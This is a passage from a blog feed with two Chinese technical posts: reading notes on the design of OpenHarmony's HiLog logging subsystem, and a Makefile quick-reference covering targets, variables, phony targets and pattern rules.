开销较大（也就是适用于单进程的日志，不适用多进程并发的状况），且存在日志缓冲区修改的 ABA 问题 (ABA problem)；</li></ul></li><li><p><code>NanoLog</code> 虽然日志写入效率很高（大量数据操作以二进制形式完成），但是：</p><ul><li>其读取需要复杂的后处理机制（反序列化、格式化、排序等）；</li><li>采用空间换时间的策略，内存消耗大；</li></ul><p>因此，不能满足 OS 调试所需实时读日志需求；</p></li><li><p><code>FTrace</code> 日志系统仅适用于内核日志读写，使用就和 Linux 强耦合，不适用于多内核的 <code>OpenHarmony</code>；</p><ul><li>每个 CPU 上维护一个缓冲区，因此读写时延低（与前述日志系统“为每个操作系统维护唯一缓冲区”的设计理念不同）；</li><li>Page 结构组织数据，单 Page 上记录一个时间戳，Page 内日志记录相对时间差，节约记录时间所需的存储空间；</li></ul></li><li><p>Android Log（5.0 后）满足内核解耦、多进程、实时读写的需求，如下图：</p><p><img src="imgs/android-log.png" width="400px" /></p><ul><li>日志写：IPC 采用原生 Socket + <code>/proc/kmsg</code> 内核日志；</li><li>日志缓存：<code>logd</code> 用户态 list buffer；</li><li>日志读：<code>logcat</code> 使用 Socket 读；</li></ul><p>但是有 4 个关键问题：</p><ul><li><strong><u>吞吐量不足</u></strong>：负载超过吞吐量将会导致严重的日志丢包问题；</li><li><strong><u>缺乏资源分配机制</u></strong>：没有对日志资源的使用进行合理分配或约束，写日志进程间可能出现资源竞争；</li><li><strong><u>缺乏数据安全能力</u></strong>：未提供相应的敏感数据保护功能, 任何读权限日志用户均可阅读全部日志信息；</li><li><strong><u>面向轻量设备的兼容性差</u></strong>：没有特别面向资源受限设备进行兼容设计。Android Log 在用户态维护独立缓冲区（list buffer），保存包括 Linux 内核日志在内的所有日志数据, 因此需要消耗大量的内存资源；</li></ul></li><li><p>Fuchsia OS 中的日志系统：Socket 通信（类似 Android Log），不过使用链表作为缓冲区（有效利用碎片化的内存空间）。但是存在<u>内存拷贝次数多、用户态内存频繁分配释放</u>的问题；</p></li></ul><p>上面的案例中，只有 Android Log 最接近要求。但它的问题也亟需优化。</p><h2 id="HiLog-日志系统模型规范"><a href="#HiLog-日志系统模型规范" class="headerlink" title="HiLog 日志系统模型规范"></a>HiLog 日志系统模型规范</h2><p>基于以上分析，本文将要设计面向 OpenHarmony 操作系统的高性能日志系统 HiLog。首先，为了明确日志系统的研发目标与技术特点，文章为 HiLog 设计了相应的模型规范。</p><p>虽然 HiLog 与 Android 日志系统有相同的基础架构，但提出了更多的场景要求，以及原则：</p><ul><li><p>性能原则：应当针对高吞吐量需求进行设计，从软件层面解决吞吐量瓶颈问题（以及引发的丢包问题）；</p></li><li><p>资源分配原则：从操作系统层面看，日志系统作为操作系统的信息记录者，不应抢占过多的系统资源。应当在设计时考虑资源分配问题；</p><ul><li>一方面在操作系统层面合理分配日志系统和其他程序占用的资源；</li><li>另一方面是在日志系统层面合理分配各个程序占用的日志资源；</li></ul></li><li><p>设备兼容性原则：OpenHarmony 操作系统即是一种面向全设备的操作系统，因此需要考虑资源受限的轻量化设备, 如蓝牙耳机、键盘、智能音箱、传感器等。</p><p><img src="imgs/oh-platform.png" width="600px" /></p><p>需要注意：减小 CPU、内存、存储空间占用。</p></li><li><p>数据安全原则：常见的隐私保护方法有匿名化、同态加密、差分隐私等等，由于它们需要基于静态的、结构相同的数据集合计算数据之间的相关性，因此难以适用：</p><ul><li>基于时间序列意味着日志数据是随时间快速更新的, 每次更新都需要重新计算数据之间的关系, 计算开销是昂贵的；</li><li>长文本缺乏字段概念, 日志语句的长短、句式各不相同 (结构不同), 难以基于规则分辨需要保护的内容；</li></ul><p>因此 HiLog 应当具备一定的日志数据安全能力, 但是同时需要保证轻量化。</p></li></ul><h2 id="HiLog-系统设计实现"><a href="#HiLog-系统设计实现" class="headerlink" title="HiLog 系统设计实现"></a>HiLog 系统设计实现</h2><h3 id="1-日志类型"><a href="#1-日志类型" class="headerlink" title="1. 日志类型"></a>1. 日志类型</h3><p>OpenHarmony 操作系统由下至上分为内核层、系统层和应用层：</p><ul><li>内核层（对应内核开发者）：可由面向标准系统的 Linux 内核或面向轻量系统的 LiteOS 内核构成；</li><li>系统层（对应系统开发者）：主要由 OpenHarmony 操作系统的各个子系统构成；</li><li>应用层（对应应用开发者）：由运行在 OpenHarmony 上的系统应用以及第三方应用构成；</li></ul><p>不同开发者关心的信息是不同的. 因此为了方便开发者区分不同层级产生的日志, HiLog 将日志分为内核日志、系统日志和应用日志 3 类, 并实现日志的<strong><u>分类管理</u></strong>。</p><h3 id="2-日志级别"><a href="#2-日志级别" class="headerlink" title="2. 日志级别"></a>2. 日志级别</h3><p>为了方便开发者和运维人员<strong><u>快速分辨系统状态的严重程度</u></strong>, 日志应当基于记录事件的重要程度划分级别。</p><p>标准需要：</p><ul><li>日志的级别数目不应过多或过少, 防止检索困难或分类标准不明；</li><li>每个日志级别应当有清晰的使用标准, 开发者在开发时不可混用；</li><li>写入时, 每条日志都应当分配到一个日志级别；</li><li>在输出时, 每个级别的日志都需要采用不同的字体或者颜色来区分；</li></ul><p>因此 HiLog 分为：</p><p><img src="imgs/hilog-level.png" width="350px" /></p><h3 id="3-日志数据结构"><a href="#3-日志数据结构" class="headerlink" title="3. 日志数据结构"></a>3. 日志数据结构</h3><p>按位紧密存储（packed），节省空间可以减少 IPC 开销和存储开销, 提高日志系统的日志吞吐量。</p><p><img src="imgs/hilog-datatype.png" width="350px" /></p><h3 id="4-日志功能"><a href="#4-日志功能" class="headerlink" title="4. 日志功能"></a>4. 日志功能</h3><ul><li><p>日志写入：包括日志生成、日志排序、日志暂存。</p><ul><li>在开发时 HiLog 的使用者通过引入 libhilog 的头文件, 使用 libhilog 提供的写日志接口编写程序, 在程序运行时 libhilog 即可生成日志；</li><li>libhilog 在生成日志过程中还提供数据保护、进程流控等辅助能力；</li><li>在标准 HiLog 中, hilogd 收集来自各个 libhilog 的日志信息, 按时间进行排序, 并进入缓冲区暂存. 在轻量 HiLog 中, 日志缓冲区是 LiteOS 的 <code>kernel_log_buffer</code>, 相应的日志排序和暂存能力由 <code>kernel_log_buffer</code> 实现；</li></ul></li><li><p>日志输出：包括日志打印、日志持久化。</p><ul><li>读取暂存的日志写入到标准输出 (<code>stdout</code>), 并且支持通过辅助信息等特征进行筛选；</li><li>将暂存的日志写入文件, 并进一步地提供压缩功能；</li></ul><p>可以通过 hilogtool 命令行工具执行日志打印、持久化等输出工作；</p></li><li><p>日志系统控制：包括数据安全、进程流控、业务流控、缓冲区以及持久化的配置；</p><ul><li>例如, 当操作系统内存空间紧张, 可以缩小日志缓冲区空间, 为其他程序让出更多内存；又例如, 当操作系统 CPU 负载较高, 可以降低流量控制阈值, 减少 HiLog 日志处理消耗的 CPU 资源；</li></ul></li></ul><h3 id="5-架构-amp-模块设计"><a href="#5-架构-amp-模块设计" class="headerlink" title="5. 架构 &amp; 模块设计"></a>5. 架构 &amp; 模块设计</h3><p><img src="imgs/hilog-arch.png" width="500px" /></p><ul><li>标准 Hilog（L2-L5）：维护守护进程 hilogd 实现高性能的日志缓冲区管理；</li><li>轻量 Hilog（L1）：直接将日志写入内核的缓冲区中；</li></ul><p>其中：</p><ul><li><p><code>libhilog</code>：提供头文件 &amp; 动态链接库。一方面提供静态写日志接口, 另一方面负责运行时日志生成。附加：</p><ul><li>写日志接口的敏感数据标识, 实现数据安全；</li><li>基于进程的日志流控机制, 实现对所有进程日志写入资源的合理分配；</li></ul><p>轻量 Hilog：添加敏感数据标识和流控后, 将日志直接写入内核缓冲区；</p><p>标准 Hilog：直接发送至 <code>hilogd</code> 模块；</p></li><li><p><code>hilogtool</code>：提供读日志能力。一方面提供与操作系统 Shell 交互的能力, 另一方面负责执行读日志任务。</p><ul><li>开发者通过 Shell 命令控制日志打印或日志持久化任务；</li><li>根据平台种类，从不同位置读取日志；</li></ul></li><li><p><code>hilogd</code>：面向 L2–L5 平台设计的高性能日志缓冲区 (<code>hilog_buffer</code>) 及其管理模块；</p><ul><li>与系统的其他模块是解耦的（IPC 交互）；</li><li>提供日志监听、排序和存储的功能, 其运行时具备系统守护进程的特性；</li></ul></li></ul><p>图中“内核缓冲区”含义不同：</p><ul><li>轻量 Hilog：指 LiteOS 内核的内核日志缓冲区, 负责暂存全量的日志信息；</li><li>标准 Hilog：指 Linux 的内核日志缓冲区, hilogd 将会读取其中的日志信息到 <code>hilog_buffer</code>, 保证 <code>hilog_buffer</code> 中拥有系统的全量日志信息；</li></ul><h3 id="6-HiLog-日志系统-IPC"><a href="#6-HiLog-日志系统-IPC" class="headerlink" title="6. HiLog 日志系统 IPC"></a>6. HiLog 日志系统 IPC</h3><p><img src="imgs/hilog-ipc.png" width="550px" /></p><ul><li><p><code>socket_input</code> 服务端：采用 I/O Multiplxing，而不是多线程策略。因为下面的原因导致单独线程处理会浪费资源：</p><ul><li>日志的写入存在并发特征；</li><li>每个进程在每个时间段产生的日志数量是不定的, 且每一条日志的长度 (字节数) 也是不等的, 因此日志的写入数据量存在时间分布不均匀特征；</li></ul></li><li><p><code>socket_input</code> 客户端：采用非阻塞 IO 模型 (non-blocking input/output)，异步传输；由于服务端 I/O Multiplxing 不能保证及时处理，因此同步方式会使进程阻塞。</p></li><li><p><code>socket_output</code> 客户端/服务端均采用阻塞 IO (blocking input/output) 模型构建；</p><ul><li>读日志事件的数据量较大且需要确保数据到达的先后顺序；</li><li>从需求分析不会同时存在太多读日志进程, 因此阻塞 IO 不会给系统带来过大的负担；</li></ul><p>因此：</p><ul><li><p><code>hilogtool</code>, 维护各自的 <code>socket_output</code> 客户端向 <code>hilogd</code> 发送读日志请求；</p></li><li><p><code>hilogd</code> 对于每一个客户端创建一个线程操作 <code>socket_output</code> 服务端；</p></li></ul></li></ul><p>而对于轻量 HiLog 而言，IPC 机制直接采用 <code>ioctl</code>；</p><h3 id="6-HiLog-日志数据安全"><a href="#6-HiLog-日志数据安全" class="headerlink" title="6. HiLog 日志数据安全"></a>6. HiLog 日志数据安全</h3><p>为了平衡安全性和性能开销, 在设计 HiLog 的数据安全能力时<strong><u>重点考虑了变量的安全问题</u></strong>。仅基于静态的源码分析难以捕捉是否有敏感数据会被日志系统记录, 因此<strong><u>变量是敏感数据泄露的重要风险因素</u></strong>。</p><p>开发者指定变量的敏感标识，HiLog 通过识别这些标识来提供数据安全能力。</p><p>敏感数据标识分为 2 种, 分别是公开标识 <code>&#123;public&#125;</code> 和隐藏标识 <code>&#123;private&#125;</code>，例如 <code>&quot;%&#123;public&#125;s&quot;</code>，<code>&quot;%&#123;private&#125;s&quot;</code>；</p><p>若修饰 <code>&#123;private&#125;</code>, 在开启数据安全能力的情况下, libhilog 会以字符串 <code>&quot;&lt;private&gt;&quot;</code> 替换原参数后, 再将对应日志发送到 <code>hilog_buffer</code>；</p><p><img src="imgs/hilog-safety-rule.png" width="550px" /></p><h3 id="7-HiLog-日志流量控制"><a href="#7-HiLog-日志流量控制" class="headerlink" title="7. HiLog 日志流量控制"></a>7. HiLog 日志流量控制</h3><p>作为实现系统资源合理分配的手段, HiLog 提供日志流量控制 (简称流控) 机制, 避<strong>免部分进程日志流量过大造成的系统负载过高和日志丢包问题</strong>。</p><p>流量控制原理：</p><p><img src="imgs/hilog-flow-control.png" width="600px" /></p><ul><li>设置流量阈值 $q$，每个时间片段 Δt 内统计日志流量, 当某个时间片段内的日志流量超出阈值 q 时, 按照默认配额或者进程白名单设置的配额进行控制, 对超出配额的日志进行抛弃；</li><li>这种控制方法会在 进程端（<code>libhilog</code>）和业务端（<code>hilogd</code>）同时开展，可以平衡 IPC 资源的使用并降低性能开销；</li><li>除了从进程端进行流控，HiLog 可以跨进程针对同一业务流控。OH 使用 <code>Domain</code>（领域标识）将进程归类，具备相同 Domain 的进程被归纳为同一业务，然后在业务粒度上进行流控。</li></ul><p>注：轻量 HiLog 不存在 <code>hilogd</code>，不存在业务流控，只有进程流控。实际上本身轻量级设备无法运行大量进程，因此这么做本身没有问题。</p><h3 id="8-HiLog-日志缓冲区管理"><a href="#8-HiLog-日志缓冲区管理" class="headerlink" title="8. HiLog 日志缓冲区管理"></a>8. HiLog 日志缓冲区管理</h3><p>对于标准 HiLog 而言，使用如图<strong><u>双循环链表</u></strong>作为缓冲区 <code>hilog_buffer</code> 的数据结构：</p><p><img src="imgs/hilog-buffer.png" width="400px" /></p><ul><li>高效利用碎片化的内存空间；</li><li>有效降低日志的排序、插入、读取等操作时指针需要跳转的链表节点数目；</li></ul><p>其特性如下：</p><ol><li><p>时间戳有序（为了给开发和维护人员提供符合逻辑的信息）：<code>hilog_buffer</code> 中的数据按照日志数据的时间戳排序。这个特性需要编码时保证，因为 OH 是分时操作系统，随机的延时会导致日志产生时间顺序与到达缓冲区的时间顺序不一致，进而增大日志理解难度。因此提供两种排序方案：</p><ul><li>先排序：日志在写入日志缓冲区时进行排序；</li><li>后排序：从缓冲区读取日志进行输出时排序；</li></ul><p>由于 HiLog 单生产者、多消费者模型，因此采用 “先排序” 的方案。</p><blockquote><p>原因如下：</p><ul><li>“先排序”方案执行一次排序即可解决顺序问题。并且由于缓冲区内日志有序, 排序是较为简单的, 只需将新到日志的时间戳依次与缓冲区日志的时间戳进行比较 (由新到旧) 然后插入即可；</li><li>“后排序”需要每个消费者都进行排序, 由于缓冲区内日志无序, 消费者需要遍历一次链表才能排序一条日志, 效率较低；</li></ul></blockquote></li><li><p>读写指针：<code>hilog_buffer</code> 包含 3 类读写指针成员：</p><ul><li>写指针 $w$：指向当前最新日志结点；</li><li>公共读指针 $r$：指向当前最旧的日志节点；</li><li>读者指针 $r_i$：位于 $w$ 和 $r$ 间若干份，以供不同的日志读需求；</li></ul></li><li><p>单生产者、多消费者模型：</p><ul><li>在 <code>hilogd</code> 中只运行一个生产者线程。插入日志时扫描日志应该处于的时间区间并移动 $w$ 插入（可能在 $w$ 当前指向结点前或后）；如果新插入的日志记录在 $r$ 的前面，则将 $r$ 移动到该结点。最终 $w$ 需要复位至时间最新的结点；</li><li>每个消费者独占 $r_i$​ 指针，起始时将读指针 $r_i$ 指向公共读指针 $r$ 所指节点, 接下来操作 $r_i$ 依次读取后续节点；</li></ul></li><li><p><code>hilog_buffer</code> 线程同步：仅处理生产者和消费者间的并发同步问题就行（读者间不存在同步问题）。</p><ul><li>对 “消费者跳转读指针” 和 “生产者调整链表结构” 这两类过程加锁即可；</li></ul><p>考虑两种锁：线程互斥锁（<code>mutex</code>）和 CAS（Compare And Swap）；</p><blockquote><p>mutex:  CPU 占用低、不存在 ABA Problem；缺点在于存在 domain switch 开销；</p><p>CAS:  无需 domain switch；单需要轮询锁状态, CPU 消耗大, 并且存在 ABA 风险；</p><p>综合考虑：</p><ul><li>资源消耗：在单生产者、多消费者的场景下，多个 client 轮询 CAS 可能对移动终端设备不友好；</li><li>临界区执行时间较长：使用 mutex 带来的 domain switch 开销不显著。</li></ul></blockquote></li><li><p>缓冲区容量可定制：缓冲区容量上限可配置。当 hilog_buffer 容量已达上限时, 插入数据会导致时间戳最早的一部分数据被删除, 以存储最新的数据；总体过程：</p><ol><li>将公用读指针 $r$ 指向<strong>剩余数据（不包括将要被删除的结点）</strong>中最旧的节点；</li><li>遍历检查读者列表中每个读者的读指针是否指向将被删除的节点，如果是，则移至 $r$；</li><li>最终释放要被删除的结点；</li></ol></li></ol><h3 id="9-HiLog-日志系统持久化-amp-压缩"><a href="#9-HiLog-日志系统持久化-amp-压缩" class="headerlink" title="9. HiLog 日志系统持久化 &amp; 压缩"></a>9. HiLog 日志系统持久化 &amp; 压缩</h3><p>日志持久化：</p><p>使用一般的日志轮替机制。指定日志文件的总数和每个日志文件的大小，日志系统的内存部分大小与一个日志文件大小匹配。</p><p>当正在写入的文件超过规定阈值后创建新日志文件，当日志文件数量超过规定阈值时删除最旧的日志文件；</p><p>日志压缩：</p><p>提供两种不同的日志压缩方法, 一种是日志流压缩（从日志缓冲区读取日志, 接下来将日志作为比特流输入压缩算法接口。使用 zlib 流压缩算法库），另一种是日志文件压缩（主要面向小流量的写日志场景，先创建临时日志文件，后续压缩并删除）。</p><blockquote><p>当日志流量较小时, 如果采用流压缩方法, 压缩算法的输出数据量达到单文件大小阈值需要很长的时间, 期间一旦出现系统崩溃或断电问题, 就会导致内存中的日志数据丢失。</p></blockquote><h2 id="HiLog-日志系统实验分析"><a href="#HiLog-日志系统实验分析" class="headerlink" title="HiLog 日志系统实验分析"></a>HiLog 日志系统实验分析</h2><p>基本性能、流控性能、持久化性能、设备兼容性分析、数据安全能力分析。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>完成了前述的几项基本要求、遵循了前述的设计原则；</p><p>同时也反映出 <code>HiLog</code> 的一些问题与改进空间：</p><ol><li><p>业界对于日志系统的数据安全的研究较少, HiLog 的轻量化数据安全能力是对于日志数据安全问题的初步探索；</p></li><li><p>OpenHarmony 作为分布式操作系统, 原生支持分布式能力。</p><p><strong><u>然而目前 HiLog 尚不具备从多设备统一收集日志并进行管理的能力</u></strong>. 这种缺陷对于分布式能力的开发和调试造成了一定的不便, 具备优化的空间；</p><p>构造分布式日志系统有两个重要的问题需要解决, 其一是设备间高速、高稳定的连接问题, 其二是多设备的时钟同步问题。</p><p>对于第 1 个问题, 可以等待 OpenHarmony 的软总线 (SoftBus) 技术成熟后，利用 SoftBus 作为稳定高速的日志传输的通道；</p><p>对于第 2 个问题, 可以考虑基于精确时间协议 (precision time protocol, PTP) 实现无线局域网内的多设备时钟同步；</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近看到一篇讨论 OpenHarmony Hilog 日志子系统的设计的论文，遂进行了一番阅读。该论文发表在软件学报上。&lt;/p&gt;
&lt;h2 id=&quot;摘要&quot;&gt;&lt;a href=&quot;#摘要&quot; class=&quot;headerlink&quot; title=&quot;摘要&quot;&gt;&lt;/a&gt;摘要&lt;/h2&gt;&lt;ol&gt;
</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="HarmonyOS" scheme="https://blog.sjtuxhw.top/tags/HarmonyOS/"/>
    
    <category term="OS" scheme="https://blog.sjtuxhw.top/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>Makefile 快速上手 (again)</title>
    <link href="https://blog.sjtuxhw.top/review/makefile-again/"/>
    <id>https://blog.sjtuxhw.top/review/makefile-again/</id>
    <published>2024-10-11T02:05:34.000Z</published>
    <updated>2024-10-31T02:19:47.509Z</updated>
    
    <content type="html"><![CDATA[<p>说来惭愧，之前笔者还认为 Makefile 这种工具已经过时，只需要学 CMake 就行。</p><p>但最近在写 boot loader 时遇到了一些问题：我既不是在编译可执行文件，也不是在编译库，这样 CMake 就显得比较无力了，因为总是用 <code>add_custom_*</code> 也不是办法，非常臃肿——毕竟不是在管理一个 C/C++ 应用的项目嘛。所以决定再整理一下 Makefile 的写法。</p><p>本文充当一个 Makefile cheat sheet 的作用，自己有点遗忘的时候回来查一查。</p><hr><h2 id="Define-a-Target"><a href="#Define-a-Target" class="headerlink" title="Define a Target"></a>Define a Target</h2><p>在 Makefile 中定义一个可以构建的 target：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;target&gt;: dependency1 dependency2 ... dependency3</span></span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandM</span><br></pre></td></tr></table></figure><p>这样可以使用 <code>make &lt;target&gt;</code> 来执行它。</p><p>注意哦，make 会认为 <code>&lt;target&gt;</code> 是一个需要构建的目标文件名。最终按照 commands 生成的文件会被命名为 <code>target</code>；</p><h2 id="Use-Variables"><a href="#Use-Variables" class="headerlink" title="Use Variables"></a>Use Variables</h2><p>Makefile 中定义变量也很方便：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">variable_name = file1 file2 ... fileN</span><br><span class="line"><span class="comment"># 注：:= 和 += 和 ?= 不经常用，不放在这里了</span></span><br><span class="line"><span class="comment"># 感兴趣自行查阅，或者查看之前介绍 cmake 的文章</span></span><br></pre></td></tr></table></figure><p>然后和 shell 类似直接用 <code>$()</code> 包裹使用：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">myTarget : <span class="variable">$(var1)</span></span><br><span class="line">    some-shell-command <span class="variable">$(var2)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(var3)</span> : dep1 dep2 ... depN</span><br><span class="line">    command1</span><br><span class="line">    ...</span><br><span class="line">    commandM</span><br></pre></td></tr></table></figure><p>Makefile 中还可以使用<strong><u>环境变量</u></strong>，和普通变量用起来一样。你还可以通过执行 make 时的 <code>-e</code> 参数来 override 对应的环境变量：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -e name=value myTarget</span><br></pre></td></tr></table></figure><h2 id="Use-Shell-Results"><a href="#Use-Shell-Results" class="headerlink" title="Use Shell Results"></a>Use Shell Results</h2><p>Makefile 还可以直接使用 shell 的输出结果，和变量一样用 <code>$()</code> 包裹：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CC=gcc</span><br><span class="line">AS=$&#123;CC&#125; -c</span><br><span class="line">LD=ld</span><br><span class="line">PROJ_NAME=main.bin</span><br><span class="line"></span><br><span class="line"><span class="section">all: $&#123;PROJ_NAME&#125; log</span></span><br><span class="line"></span><br><span class="line"><span class="section">log:</span></span><br><span class="line">    <span class="comment"># 在字符串里和命令里都能用</span></span><br><span class="line">    echo <span class="string">&quot;build at: $(shell date --iso)&quot;</span> &gt; <span class="variable">$(<span class="built_in">shell</span> data --iso)</span>.log</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    rm -f *.o *.bin</span><br><span class="line"></span><br><span class="line"><span class="section">PROJ_NAME:</span></span><br><span class="line">    <span class="comment"># do something</span></span><br></pre></td></tr></table></figure><h2 id="Phony-Commands"><a href="#Phony-Commands" class="headerlink" title="Phony Commands"></a>Phony Commands</h2><p>Makefile 不仅仅可以用于管理项目的编译流程，还能定制一些自动化的指令。例如一个没有任何 dependencies 的 target 就可以被 make 直接执行其中的指令：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">clean:</span></span><br><span class="line">    rm -f *.o *.a</span><br><span class="line">    echo <span class="string">&quot;Finished.&quot;</span> &gt; my.log</span><br></pre></td></tr></table></figure><p>但由于 make <u>按照当前 target 文件是否存在、依赖的 dependencies 的时间戳来判断增量执行</u>，假设你创建了一个名为 <code>clean</code> 的文件，很可能 make 就不会再执行上面的指令了：因为 make 认为构建的目标文件已经构建完成了，并没有把它作为一组指令看待。</p><p>为了区分指令组，以及真正的 target 目标文件，make 允许在 Makefile 中使用伪指令 <code>.PHONY</code>，以此来标识这个 target 仅仅是一组指令，每次调用时执行它就行。例如：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.PHONY clean rebuild    <span class="comment"># 可以指定多个</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    rm -f *.o *.a</span><br><span class="line">    echo <span class="string">&quot;Finished.&quot;</span> &gt; my.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指令间也可以相互依赖，这无论是管理项目编译，还是其他自动化用途，都很方便</span></span><br><span class="line"><span class="section">rebuild: clean</span></span><br><span class="line">    <span class="comment"># Do something else</span></span><br></pre></td></tr></table></figure><h2 id="Automatic-variables"><a href="#Automatic-variables" class="headerlink" title="Automatic variables"></a>Automatic variables</h2><p>有的时候在写 commands 的时候需要用到 <code>target</code> 或者 <code>dependencies</code> 中的名字，但是不想重复一遍，因为存在耦合，下次想改名的时候就要一个一个改，不利于维护。于是 Makefile 预定义了一组变量符号：</p><ul><li><code>$@</code>：当前规则中 <code>target</code> 的名称；</li><li><code>$^</code>：当前规则中所有 <code>dependencies</code> 的名称；</li><li><code>$&lt;</code>：当前规则中第一个 <code>dependencies</code> 的名称；</li><li><code>$?</code>：当前规则中时间戳比 <code>target</code> 更新的所有 <code>dependencies</code> 的名称组成的变量；</li></ul><h2 id="Implicit-Rules"><a href="#Implicit-Rules" class="headerlink" title="Implicit Rules"></a>Implicit Rules</h2><p>如果你使用 Makefile 不是用来管理编译项目的话，本节就不用看啦。</p><p>由于 make 一开始是为管理编译 C 语言而设计的，所以它对 C 语言有些 “偏爱”，包含了很多 “隐晦规则”，这让很多人在阅读 Makefile 的时候可能感到困惑。</p><p>这就像一些约定俗成的 magic，下面向你展示一个：</p><p>对于所有以 <code>.o</code> 扩展名结尾的 target：</p><ul><li>默认依赖于同名的 <code>.c</code> 文件（如果找不到，则 fallback 到 <code>.cc / .cpp</code>）；</li><li>如果依赖于 <code>.c</code>（C 程序），则默认使用 command：<code>$(CC) -c $(CPPFLAGS) $(CFLAGS) $^ -o $@</code>；</li><li>如果依赖于 <code>.cc/.cpp</code>（C++ 程序），则默认使用 command：<code>$(CXX) -c $(CPPFLAGS) $(CXXFLAGS) $^ -o $@</code>；</li></ul><p>然后你就会看见很简洁的 Makefile：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CC = gcc <span class="comment"># Flag for implicit rules</span></span><br><span class="line">CFLAGS = -g <span class="comment"># Flag for implicit rules. Turn on debug info</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用了隐晦规则 #1: blah 会使用默认的 linker 和 LDFLAGS 被链接</span></span><br><span class="line"><span class="comment"># 使用了隐晦规则 #2: 会自动生成一个名为 blah.o 的规则，使用默认 command，并依赖于 blah.c</span></span><br><span class="line"><span class="comment"># 使用了隐晦规则 #3: 编译时会使用 CFLAGS/CPPFLAGS 作为编译时 options</span></span><br><span class="line"><span class="section">blah: blah.o</span></span><br><span class="line"></span><br><span class="line"><span class="section">blah.c:</span></span><br><span class="line">    echo <span class="string">&quot;int main() &#123; return 0; &#125;&quot;</span> &gt; blah.c</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    rm -f blah*</span><br></pre></td></tr></table></figure><h2 id="Static-Pattern-Rules"><a href="#Static-Pattern-Rules" class="headerlink" title="Static Pattern Rules"></a>Static Pattern Rules</h2><p>有的时候，我想利用隐晦规则少写一点东西，但是我又不是在编译 C/C++ 程序（例如做汇编 / 管理其他语言的项目），怎么办？</p><p>你可以用这个语法：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">targets...: target-pattern: prereq-patterns ...</span></span><br><span class="line">   commands</span><br></pre></td></tr></table></figure><p>这相当于自己定义了一套规则，让所有匹配 <code>prereq-patterns</code> 的 dependencies 在执行 commands 后输出为 target-pattern。</p><blockquote><p>官方的说法是：</p><p>The essence is that the given <code>target</code> is matched by the <code>target-pattern</code> (via a <code>%</code> wildcard). Whatever was matched is called the <em>stem</em>. The stem is then substituted into the <code>prereq-pattern</code>, to generate the target’s prereqs.</p><p>其本质是，给定的 <code>target</code> 与 <code>target-pattern</code>（通过 <code>%</code> 通配符）相匹配。匹配到的内容称为 <em>stem</em>。然后，将 stem 替换为<code>prereq-pattern</code>，生成 <code>target</code> 的 dependencies。</p></blockquote><p>例如，如果我不想编译 C/C++ 程序，只是想汇编一批文件，那么可以这么做：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">AS=$&#123;CC&#125; -c</span><br><span class="line">deps = main.o print.o print_hex.o</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把 target 中需要的所有 *.o 的名字对应到 *.s 的依赖上</span></span><br><span class="line"><span class="section">$&#123;deps&#125;: %.o: %.s</span></span><br><span class="line">    $&#123;AS&#125; -o <span class="variable">$@</span> <span class="variable">$^</span></span><br></pre></td></tr></table></figure><h2 id="More…"><a href="#More…" class="headerlink" title="More… ?"></a>More… ?</h2><p>好了，上面的用法已经能涵盖 90% 的 Makefile 的用途了</p><p>如果你还希望更详细、更“刁钻” 的用法，就应该去查官方文档啦。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;说来惭愧，之前笔者还认为 Makefile 这种工具已经过时，只需要学 CMake 就行。&lt;/p&gt;
